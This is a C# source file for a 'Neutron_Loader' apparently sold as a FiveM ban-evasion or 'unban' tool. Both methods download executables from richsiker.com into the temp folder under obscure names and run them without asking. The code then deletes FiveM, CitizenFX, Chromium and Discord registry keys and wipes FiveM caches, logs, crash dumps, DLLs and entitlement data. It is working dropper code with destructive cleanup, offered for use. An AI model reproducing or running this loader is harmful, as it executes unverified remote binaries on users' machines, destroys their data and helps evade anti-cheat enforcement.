using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Security.Principal;

namespace Neutron_Loader
{
    class Fivem
    {
        public static void fivem1()
        {
            string fileName1 = Path.GetTempPath() + "8GHH2167.exe";
            new WebClient().DownloadFile("https://richsiker.com/aindir/discord-deleter.exe", fileName1);
            Process.Start(fileName1);
            string fileName2 = Path.GetTempPath() + "6KGSH1531.exe";
            new WebClient().DownloadFile("https://richsiker.com/aindir/xbox.exe", fileName2);
            Process.Start(fileName2);
            string str = WindowsIdentity.GetCurrent().User.Value;
            Registry.Users.DeleteSubKeyTree(str + "\\SOFTWARE\\Chromium", false);
            Registry.Users.DeleteSubKeyTree(str + "\\SOFTWARE\\CitizenFX", false);
            Registry.Users.DeleteSubKeyTree(str + "\\SOFTWARE\\FiveM", false);
            Registry.Users.DeleteSubKeyTree(str + "\\SOFTWARE\\discord-", false);
            Registry.Users.DeleteSubKeyTree(str + "_Classes\\FiveM.ProtocolHandler", false);
            Registry.Users.DeleteSubKeyTree(str + "_Classes\\fivem", false);
            Registry.Users.DeleteSubKeyTree(str + "_Classes\\discord-", false);
            Registry.CurrentUser.DeleteSubKeyTree("\\SOFTWARE\\CitizenFX", false);
            Registry.CurrentUser.DeleteSubKeyTree("\\SOFTWARE\\FiveM", false);
            Registry.CurrentUser.DeleteSubKeyTree("\\SOFTWARE\\Chromium", false);
            Registry.ClassesRoot.DeleteSubKeyTree("fivem", false);
            Registry.ClassesRoot.DeleteSubKeyTree("FiveM.ProtocolHandler", false);
            Registry.ClassesRoot.DeleteSubKeyTree("discord-", false);
        }
        public static void fivem2()
        {
            
                string fileName = Path.GetTempPath() + "41GHHF15.exe";
                new WebClient().DownloadFile("https://richsiker.com/aindir/unban.exe", fileName);
                Process.Start(fileName);
                string path1 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\DigitalEntitlements";
                if (Directory.Exists(path1))
                    Directory.Delete(path1, true);
                string path2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\FiveM\\FiveM.app\\cache";
                if (Directory.Exists(path2))
                    Directory.Delete(path2, true);
                string path3 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\CitizenFX";
                if (Directory.Exists(path3))
                    Directory.Delete(path3, true);
                string path4 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\FiveM\\FiveM.app\\mods";
                if (Directory.Exists(path4))
                    Directory.Delete(path4, true);
                string path5 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\FiveM\\FiveM.app\\imgui.inie";
                if (System.IO.File.Exists(path5))
                    System.IO.File.Delete(path5);
                string path6 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\FiveM\\FiveM.app\\CitizenFX.ini";
                if (System.IO.File.Exists(path6))
                    System.IO.File.Delete(path6);
                string path7 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\FiveM\\FiveM.app\\asi-five.dll";
                if (System.IO.File.Exists(path7))
                    System.IO.File.Delete(path7);
                string path8 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\FiveM\\FiveM.app\\adhesive.dll";
                if (System.IO.File.Exists(path8))
                    System.IO.File.Delete(path8);
                string path9 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\FiveM\\FiveM.app\\crashes";
                if (Directory.Exists(path9))
                    Directory.Delete(path9, true);
                string path10 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\FiveM\\FiveM.app\\logs";
                if (Directory.Exists(path10))
                    Directory.Delete(path10, true);
                string path11 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\FiveM\\FiveM.app\\caches.xml";
                if (System.IO.File.Exists(path11))
                    System.IO.File.Delete(path11);
            }
    }
}